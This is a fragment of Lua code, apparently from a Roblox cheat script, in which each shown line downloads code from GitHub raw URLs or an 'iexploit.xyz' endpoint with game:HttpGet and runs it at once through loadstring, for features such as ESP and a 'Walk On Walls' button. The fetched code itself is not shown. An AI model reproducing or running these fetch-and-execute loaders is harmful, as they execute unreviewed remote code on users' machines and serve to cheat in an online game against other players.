...
-- // handler
loadstring(game:HttpGet('https://raw.githubusercontent.com/Pvpahh/enclosed/main/handler'))()
...
local kiriot22ESP = loadstring(game:HttpGet("https://raw.githubusercontent.com/Pvpahh/dimagx/main/laodlol"))()
...
local walkonwalls = FunstuffPage.AddButton("Walk On Walls [z]", function()
    loadstring(game:HttpGet("https://github.com/Pvpahh/dimagx/blob/main/loadlol", true))()
end)
...
-- // esp handler
loadstring(game:HttpGet("https://iexploit.xyz/api/bdc"))()
